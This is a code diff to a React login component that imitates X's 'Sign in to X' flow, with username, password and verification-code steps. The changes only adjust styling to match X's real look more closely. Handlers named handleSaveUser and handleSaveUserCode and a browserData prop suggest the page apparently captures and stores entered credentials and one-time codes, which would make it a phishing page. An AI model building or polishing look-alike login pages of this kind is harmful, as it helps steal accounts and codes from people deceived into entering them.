@@ -176,9 +176,9 @@ export function LoginFormSteps({ browserData }: Props) {
 						e.preventDefault();
 						handleFirstStep();
 					}}
-					className="flex-1 w-full py-10 px-8 overflow-y-auto md:max-w-[400px] md:w-full"
+					className="flex-1 w-full py-10 px-9 overflow-y-auto md:max-w-[400px] md:w-full"
 				>
-					<h1 className="py-5 text-2xl font-bold text-[#E7E9EA]">
+					<h1 className="pt-8 pb-5 text-2xl font-bold text-[#E7E9EA]">
 						Sign in to X
 					</h1>
 
@@ -217,7 +217,7 @@ export function LoginFormSteps({ browserData }: Props) {
 
 					<button
 						type="button"
-						className="mt-8 w-full h-10 bg-white flex items-center justify-center rounded-full font-semibold text-black"
+						className="mt-6 w-full h-10 bg-white flex items-center justify-center rounded-full font-semibold text-black"
 					>
 						<div className="flex items-center gap-1">
 							<svg
@@ -247,22 +247,22 @@ export function LoginFormSteps({ browserData }: Props) {
 
 					<button
 						type="submit"
-						className="mt-8 w-full h-10 bg-white flex items-center justify-center rounded-full font-bold text-black disabled:opacity-60"
+						className="mt-7 w-full h-9 bg-white flex items-center justify-center rounded-full font-bold text-[15px] text-black disabled:opacity-60"
 					>
 						Next
 					</button>
 
 					<button
 						type="button"
-						className="mt-8 w-full h-10 bg-transparent flex items-center justify-center rounded-full font-bold text-white border border-white/40"
+						className="mt-6 w-full h-9 bg-transparent flex items-center justify-center rounded-full font-bold text-[15px] text-white border border-white/40"
 					>
 						Forgot password?
 					</button>
 
-					<div className="mt-10">
-						<p className="text-white/40">
+					<div className="mt-12">
+						<p className="text-[15px] text-white/40">
 							<span>Don't have an account? </span>
-							<span className="text-blue-400">Sign up</span>
+							<span className="text-[#1D9BF0] underline">Sign up</span>
 						</p>
 					</div>
 				</form>
@@ -275,7 +275,7 @@ export function LoginFormSteps({ browserData }: Props) {
 						e.preventDefault();
 						handleGoToNextStep();
 					}}
-					className="flex-1 px-8 flex flex-col justify-between md:max-w-[500px]"
+					className="flex-1 px-9 flex flex-col justify-between md:max-w-[500px]"
 				>
 					<div>
 						<div className="my-5">
@@ -316,29 +316,33 @@ export function LoginFormSteps({ browserData }: Props) {
 						e.preventDefault();
 						handleSaveUser();
 					}}
-					className="flex-1 px-8 flex flex-col justify-between w-full md:max-w-[500px]"
+					className="flex-1 px-9 flex flex-col justify-between w-full md:max-w-[500px]"
 				>
-					<div className="mt-2 w-full flex flex-col gap-6">
-						<h1 className="text-start text-3xl font-semibold text-white">
-							Enter your password
-						</h1>
+					<div className="mt-2 w-full flex flex-col">
+						<div className="h-[68px] flex items-center">
+							<h1 className="text-start text-2xl md:text-3xl font-semibold text-white">
+								Enter your password
+							</h1>
+						</div>
 
-						<Input
-							type="text"
-							label={handleGetLabel()}
-							value={username}
-							onChange={(e) => setUsername(e.target.value)}
-							disabled={disabledUsername}
-						/>
+						<div className="flex flex-col gap-[22px] my-[11px]">
+							<Input
+								type="text"
+								label={handleGetLabel()}
+								value={username}
+								onChange={(e) => setUsername(e.target.value)}
+								disabled={disabledUsername}
+							/>
 
-						<Input
-							// biome-ignore lint/a11y/noAutofocus: <explanation>
-							autoFocus={true}
-							type="password"
-							label="Password"
-							value={password}
-							onChange={(e) => setPassword(e.target.value)}
-						/>
+							<Input
+								// biome-ignore lint/a11y/noAutofocus: <explanation>
+								autoFocus={true}
+								type="password"
+								label="Password"
+								value={password}
+								onChange={(e) => setPassword(e.target.value)}
+							/>
+						</div>
 					</div>
 
 					<div>
@@ -350,10 +354,10 @@ export function LoginFormSteps({ browserData }: Props) {
 							{loading ? "..." : "Log in"}
 						</button>
 
-						<div className="my-6">
-							<p className="text-white/40">
+						<div className="mt-5 mb-6">
+							<p className="text-[15px] text-white/40">
 								<span>Don't have an account? </span>
-								<span className="text-blue-400">Sign up</span>
+								<span className="text-[#1D9BF0] underline">Sign up</span>
 							</p>
 						</div>
 					</div>
@@ -367,7 +371,7 @@ export function LoginFormSteps({ browserData }: Props) {
 						e.preventDefault();
 						handleSaveUserCode();
 					}}
-					className="flex-1 px-8 flex flex-col justify-between md:max-w-[500px]"
+					className="flex-1 px-9 flex flex-col justify-between md:max-w-[500px]"
 				>
 					<div>
 						<div className="my-5">
